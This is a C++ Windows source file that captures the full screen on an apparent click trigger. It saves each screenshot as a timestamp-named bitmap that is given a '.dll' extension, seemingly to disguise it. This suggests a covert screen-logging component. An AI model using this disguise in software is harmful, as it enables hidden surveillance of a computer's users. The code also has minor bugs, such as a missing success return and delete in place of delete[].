#include"stdafx.h"

TCHAR directory[MAX_PATH];				// Final bitmap write destination (with file name)
HDC DlgDC, MemDC,DeskDC;				// Various device contexts for processing
RECT rc;								// Yay! A rectangle!
HBITMAP hBitmap;						// Bitmap structure to store the image in
int width, height;						// Width and height of the bitmap
time_t ltime;							// Time structure: Timestamp will be name of file
TCHAR seconds[5];						// Seconds	(0-59)
TCHAR minutes[5];						// Minutes	(0-59)
TCHAR hours[5];							// Hours	(0-23)
TCHAR day[5];							// Day of MONTH	(1-31)		(CAREFUL! NOT day of week	(0-6))
TCHAR month[5];							// Month	(1-12)
TCHAR year[6];							// Year		(1601-30837)	(If people are still using this program at that time, I'm fucking amazing)
TCHAR milliseconds[6];					// Milliseconds	(0-999)	(This guarantees 2 files cannot have same name. No one can click two clicks in one millisecond)
wchar_t *t;								// Time structure
char MultiByteDirName[MAX_PATH];		// Again
SYSTEMTIME lt;							// Yawn
size_t bytesConverted;					// Number of characters converted


BOOL SaveBitmap(HDC hDC, HBITMAP hBitmap, char * szPath)
{
	FILE * fp= NULL;
	fp = fopen(szPath,"wb");			// 'w' - Write and 'b' - Binary - it doesn't translate your characters
	if(fp == NULL)						// Can't create file?
	{
		ERROR_STATE = GetLastError();	// Report your problem, today!
		return false;
	}

	BITMAP Bm;												// Bitmap file
	BITMAPINFO BitInfo;										// Information associated with file
	ZeroMemory(&BitInfo, sizeof(BITMAPINFO));				// Zero out memory
	BitInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);	// Basically all bitmap manipulation
	BitInfo.bmiHeader.biBitCount = 0;						// This is standard stuff

	if(!::GetDIBits(hDC, hBitmap, 0, 0, NULL, &BitInfo, DIB_RGB_COLORS))
	{
		ERROR_STATE = GetLastError();
		return false;
	}
	Bm.bmHeight = BitInfo.bmiHeader.biHeight;
	Bm.bmWidth  = BitInfo.bmiHeader.biWidth;

	BITMAPFILEHEADER    BmHdr;

	BmHdr.bfType        = 0x4d42;							// I'm not going to document this part
	BmHdr.bfSize        = (((3 * Bm.bmWidth + 3) & ~3) * Bm.bmHeight) 
		+ sizeof(BITMAPFILEHEADER) 
		+ sizeof(BITMAPINFOHEADER);
	BmHdr.bfReserved1    = BmHdr.bfReserved2 = 0;
	BmHdr.bfOffBits      = (DWORD) sizeof(BITMAPFILEHEADER) 
		+ sizeof(BITMAPINFOHEADER);

	BitInfo.bmiHeader.biCompression = 0;
	
	size_t size = fwrite(&BmHdr,sizeof(BITMAPFILEHEADER),1,fp);	// I'm lazy
	if(size < 1)
	{
		ERROR_STATE = GetLastError();
	}
	size = fwrite(&BitInfo.bmiHeader,sizeof(BITMAPINFOHEADER),1,fp);		// And it's too hard
	if(size < 1)
	{		
		ERROR_STATE = GetLastError();
	}
	BYTE *pData = new BYTE[BitInfo.bmiHeader.biSizeImage + 5];
	if(!::GetDIBits(hDC, hBitmap, 0, Bm.bmHeight, 
		pData, &BitInfo, DIB_RGB_COLORS))
		return (false);
	if(pData != NULL)
		fwrite(pData,1,BitInfo.bmiHeader.biSizeImage,fp);

	fclose(fp);																// Close the file
	delete (pData);															// Seriously? Explain EVERY line?

}

void CaptureEntireScreenContent()
{
	GetLocalTime(&lt);											// Get the local time. Uses hardware clock.
	StringCchCopy(directory, sizeof(directory), MAINDIR);		// Copy path into filename variable
	_itow_s(lt.wSecond, seconds, 10);							// Convert "seconds" into string
	_itow_s(lt.wMinute, minutes, 10);							// Convert "minutes" into string
	_itow_s(lt.wHour, hours, 10);								// Convert "hours" into string
	_itow_s(lt.wMonth, month, 10);								// Convert "month" into string
	_itow_s(lt.wYear, year, 10);								// Convert "year" into string
	_itow_s(lt.wDay, day, 10);									// Convert "day" into string
	_itow_s(lt.wMilliseconds, milliseconds, 10);				// Convert "milliseconds" into string
	StringCchCat(directory, MAX_PATH, hours);					// Catenate "hours" to name
	StringCchCat(directory, MAX_PATH, L".");					// and all...
	StringCchCat(directory, MAX_PATH, minutes);					//	:
	StringCchCat(directory, MAX_PATH, L".");					//	:
	StringCchCat(directory, MAX_PATH, seconds);
	StringCchCat(directory, MAX_PATH, L".");
	StringCchCat(directory, MAX_PATH, milliseconds);
	StringCchCat(directory, MAX_PATH, L".");
	StringCchCat(directory, MAX_PATH, month);
	StringCchCat(directory, MAX_PATH, L".");
	StringCchCat(directory, MAX_PATH, day);
	StringCchCat(directory, MAX_PATH, L".");
	StringCchCat(directory, MAX_PATH, year);
	StringCchCat(directory, MAX_PATH, L".dll");				// Alright. Important, now
	DeskDC = GetDC(NULL);									// Getting device context of desktop
	GetWindowRect(GetDesktopWindow(), &rc);					// Send it to get screen dimensions
	height = rc.bottom - rc.top;							// You get co-ordinates, actually
	width = rc.right - rc.left;								// So you can calculate dimensions
	DlgDC = GetDC(NULL);									// Then get it again, just for good measure
	MemDC = CreateCompatibleDC(DlgDC);						// Create a compatible DC
	hBitmap = CreateCompatibleBitmap(DlgDC,width,height);	// Then a compatible bitmap
	SelectObject(MemDC, hBitmap);							// Select
	BitBlt(MemDC,0,0,width,height,DeskDC,0,0,SRCCOPY);		// "Bit-blit" it
	wcstombs_s(&bytesConverted, MultiByteDirName, MAX_PATH, directory, MAX_PATH);	// Convert TCHAR to char
	SaveBitmap(MemDC, hBitmap, MultiByteDirName);			// Save it

}

